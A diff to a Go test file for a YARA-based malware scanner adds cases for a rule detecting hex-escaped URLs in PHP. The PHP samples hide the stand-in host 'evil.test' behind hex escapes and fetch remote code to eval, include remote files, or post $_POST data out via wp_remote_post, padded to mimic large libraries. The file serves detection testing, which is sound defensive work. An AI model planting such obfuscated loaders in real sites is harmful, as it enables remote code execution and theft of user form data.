@@ -5,6 +5,7 @@ package yara_test
 import (
 	"path/filepath"
 	"runtime"
+	"strings"
 	"testing"
 
 	"github.com/pidginhost/csm/internal/signatures"
@@ -156,6 +157,57 @@ $key = ImPlOdE ('', ArRaY (ChR (116), ChR (121), ChR (112), ChR (101)));`,
 			name:   "plain URL",
 			rule:   "php_hex_escaped_url",
 			sample: `<?php $url = "https://api.example.test";`,
+		},
+		{
+			name: "sparse escaped URL in a large library",
+			rule: "php_hex_escaped_url",
+			sample: `<?php $url = "\x68\x74\x74\x70\x3a\x2f\x2f\x77\x77\x77";` +
+				strings.Repeat("\nfunction render_cell($value) { return trim($value); }", 1600),
+		},
+		{
+			name: "oversized escaped URL in direct fetch",
+			rule: "php_hex_escaped_url",
+			want: true,
+			sample: `<?php $payload = file_get_contents("\x68\x74\x74\x70\x3a\x2f\x2f\x65\x76\x69\x6c\x2e\x74\x65\x73\x74");` +
+				strings.Repeat("\nfunction render_cell($value) { return trim($value); }", 1600),
+		},
+		{
+			name: "oversized staged escaped URL loader",
+			rule: "php_hex_escaped_url",
+			want: true,
+			sample: `<?php $url = "\x68\x74\x74\x70\x3a\x2f\x2f\x65\x76\x69\x6c\x2e\x74\x65\x73\x74";` +
+				`$payload = file_get_contents($url); eval($payload);` +
+				strings.Repeat("\nfunction render_cell($value) { return trim($value); }", 1600),
+		},
+		{
+			name: "oversized escaped URL include",
+			rule: "php_hex_escaped_url",
+			want: true,
+			sample: `<?php include "\x68\x74\x74\x70\x3a\x2f\x2f\x65\x76\x69\x6c\x2e\x74\x65\x73\x74";` +
+				strings.Repeat("\nfunction render_cell($value) { return trim($value); }", 1600),
+		},
+		{
+			name: "oversized escaped URL curl option",
+			rule: "php_hex_escaped_url",
+			want: true,
+			sample: `<?php curl_setopt($handle, CURLOPT_URL, "\x68\x74\x74\x70\x3a\x2f\x2f\x65\x76\x69\x6c\x2e\x74\x65\x73\x74");` +
+				`$payload = curl_exec($handle); eval($payload);` +
+				strings.Repeat("\nfunction render_cell($value) { return trim($value); }", 1600),
+		},
+		{
+			name: "oversized escaped URL variable include",
+			rule: "php_hex_escaped_url",
+			want: true,
+			sample: `<?php $url = "\x68\x74\x74\x70\x3a\x2f\x2f\x65\x76\x69\x6c\x2e\x74\x65\x73\x74"; require_once $url;` +
+				strings.Repeat("\nfunction render_cell($value) { return trim($value); }", 1600),
+		},
+		{
+			name: "oversized escaped URL outbound request",
+			rule: "php_hex_escaped_url",
+			want: true,
+			sample: `<?php $endpoint = "\x68\x74\x74\x70\x3a\x2f\x2f\x65\x76\x69\x6c\x2e\x74\x65\x73\x74";` +
+				`wp_remote_post($endpoint, array('body' => $_POST));` +
+				strings.Repeat("\nfunction render_cell($value) { return trim($value); }", 1600),
 		},
 		{
 			name: "hardened timthumb with webshot disabled",
